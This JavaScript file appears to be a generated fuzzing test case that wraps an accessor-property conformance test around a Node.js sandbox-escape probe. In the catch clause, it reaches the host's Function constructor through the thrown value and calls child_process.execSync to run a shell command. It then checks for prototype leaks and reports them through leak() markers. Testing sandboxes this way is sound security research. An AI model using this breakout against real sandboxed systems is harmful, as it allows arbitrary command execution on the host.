try {
    var obj = {};
    var proto = {};
    var data1 = 'data';
    var data2 = 'data';
    Object.defineProperty(proto, 'set', {
        get: function () {
            let REPLACER = 23;
            return function (value) {
                let REPLACER = 23;
                data1 = value;
            };
        }
    });
    var ConstructFun = function () {
        throw () => {
            return () => {
            };
        };
    };
    ConstructFun.prototype = proto;
    var child = new ConstructFun();
    Object.defineProperty(child, 'set', {
        get: function () {
            return function (value) {
                data2 = value;
            };
        }
    });
    Object.defineProperty(obj, 'property', child);
    obj.property = 'ownAccessorProperty';
    assert(obj.hasOwnProperty('property'), 'obj.hasOwnProperty("property") !== true');
    assert.sameValue(data1, 'data', 'data1');
    assert.sameValue(data2, 'ownAccessorProperty', 'data2');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}